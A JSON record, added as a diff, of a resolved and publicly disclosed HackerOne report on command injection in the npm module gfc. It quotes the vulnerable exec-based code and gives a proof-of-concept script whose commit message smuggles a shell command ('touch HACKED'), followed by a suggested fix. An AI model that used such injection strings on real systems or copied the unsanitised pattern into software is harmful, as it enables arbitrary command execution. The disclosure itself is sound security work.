@@ -1,0 +1,122 @@
+{
+  "id": 871071,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzEwNzE=",
+  "url": "https://hackerone.com/reports/871071",
+  "title": "[gfc] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-11T20:02:14.558Z",
+  "submitted_at": "2020-05-11T20:02:14.558Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-27T20:26:38.379Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-09-27T20:26:35.170Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `gfc` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `gfc`\n**version:** `2.0.2`\n**npm page:** `https://www.npmjs.com/package/gfc`\n\n## Module Description\n\nSimple way to initialize a new git repository in an empty directory, add a file and do a first commit (or skip that part in a directory with files). Useful for unit tests and generators.\n\n## Module Stats\n\n[15] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any proper sanitization. \nHere's the code which causes the issue:\n\n```javascript\n\n// https://github.com/jonschlinkert/gfc/blob/master/index.js#L80\n...\nconst cp = require('child_process');\n...\nconst firstCommit = async(cwd, options, callback) => {\n    ....\n    const opts = Object.assign({ cwd: cwd }, options);\n    ....\n    .then(async() => {\n      return await exec(createArgs(opts), execOpts); //<-- options\n    });\n...\n\nfunction createArgs(options) {\n  const opts = Object.assign({}, defaults, options);\n  const args = ['git init'];\n  const files = opts.files ? arrayify(opts.files).join(' ') : '.';\n  let message = opts.message || 'First commit';\n\n  if (message[0] !== '\"' && message.slice(-1) !== '\"') {\n    message = `\"${message}\"`; //<-- injection\n  }\n\n  // backwards compatibility\n  if (opts.skipCommit === true) {\n    opts.commit = false;\n  }\n\n  if (opts.forceFile === true || (opts.file !== false && isEmpty(opts.cwd))) {\n    args.push('touch \"' + opts.file.path + '\"');\n\n    if (opts.file.contents) {\n      args.push('echo \"' + opts.file.contents.toString() + '\" >> ' + opts.file.path);\n    }\n  }\n\n  if (opts.commit !== false) {\n    args.push(`git add ${files}`);\n    args.push(`git commit -m ${message}`);\n  }\n\n  if (typeof opts.remote === 'string' && isGitUrl(opts.remote)) {\n    args.push(`git remote add origin ${opts.remote}`);\n\n    if (opts.push === true) {\n      args.push('git push --force origin master:master');\n    }\n  }\n\n  return args.join(' && ');\n}\n```\nThe arguments `options` is used to build the command that is passed to the `child_process.exec` function without any sanitization.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `gfc` module:\n    -  `npm i gfc`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\n\nconst firstCommit = require('gfc');\nconst options = {message: '\"\"; touch HACKED;'};\nfirstCommit('.', options, function(err) {});\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F824264}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `gfc` module via insecure command formatting.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 824264,
+      "file_name": "gfc_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VTf6FkcX3AaTAtGJE3LnXuBY?response-content-disposition=attachment%3B%20filename%3D%22gfc_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27gfc_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134412Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=08df70930b44cceb61337b737ffacd9b0167b7abf97e06d9433f4b430d6fd39b",
+      "file_size": 830792,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-27T20:26:35.263Z",
+  "allow_singular_disclosure_after": -104001456.92225899,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "xnutronex",
+    "sudosu_x-5",
+    "irshadmohammed"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
